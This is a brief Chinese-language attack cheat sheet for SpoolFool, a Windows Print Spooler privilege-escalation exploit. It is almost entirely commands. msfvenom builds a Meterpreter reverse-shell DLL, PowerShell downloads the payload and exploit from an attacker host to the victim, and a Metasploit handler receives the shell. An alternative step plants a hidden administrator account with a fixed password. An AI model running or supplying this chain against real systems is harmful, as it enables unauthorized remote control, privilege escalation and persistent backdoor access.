	https://github.com/ly4k/SpoolFool
	>whoami /user /groups 隶属NT AUTHORITY\INTERACTIVE组
	生成dll
	>msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll LHOST=192.168.0.20 LPORT=9501 > reverse_64bit.dll
	靶机执行
	>powershell -c iwr http://192.168.0.20/reverse_64bit.dll -outf \Users\Public\reverse.dll
	>powershell -c iwr http://192.168.0.20/SpoolFool.exe -outf \Users\Public\SpoolFool.exe
	>SpoolFool.exe -dll reverse.dll
	攻击机
	>msfconsole
	>use multi/handler
	>set payload windows/x64/meterpreter/reverse_tcp
	>set LHOST 192.168.0.20
	>set LPORT 9501
	>run
	或直接添加administrators组用户
	>SpoolFool.exe -dll Adduser.dll
	添加administrators组用户admin/Passw0rd!